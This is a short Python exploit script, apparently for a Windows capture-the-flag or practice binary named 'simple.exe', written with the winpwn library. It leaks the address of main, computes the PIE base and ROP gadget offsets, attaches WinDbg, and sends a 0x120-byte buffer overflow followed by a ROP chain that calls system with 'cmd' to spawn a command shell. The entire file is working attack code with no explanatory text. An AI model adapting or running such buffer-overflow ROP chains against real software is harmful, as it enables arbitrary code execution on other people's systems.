from winpwn import *

context.arch = 'amd64'
context.windbg = "C:\\Users\\kruztw\\AppData\Local\\Microsoft\\WindowsApps\\WinDbgX.exe"

r = process("./simple.exe")


r.recvuntil(' @ ')
main_addr = int(r.recvline().strip(), 16)
print("main_addr @ ", hex(main_addr))
pie_base = main_addr - 0x676
print("pie_base @ ", hex(pie_base))
bss = pie_base + 0xd000 - 0xc00

gadget_offset = 0x0000000140012ffb - 0x23fb
pop_rax = 0x0000000140012116 - gadget_offset + pie_base
pop_rcx_rax_addr_can_write = 0x0000000140012ffb - gadget_offset + pie_base
ret = 0x0000000140011015 - gadget_offset + pie_base
main_print = pie_base + 0xdb4
exit_got = pie_base + 0xdaa0
system = 0x0007ffe5a1c0200 - 0x7ff754ea1276 + main_addr

windbg.attach(r)
input('~0s;'+'gu;'*28)

print(hex(pie_base+pop_rax))
r.sendline('a'*0x120 + p64(pop_rax) + p64(bss+0x800) + p64(pop_rcx_rax_addr_can_write) + 'a'*8 + p64(ret) + p64(system) + 'cmd\x00')

r.interactive()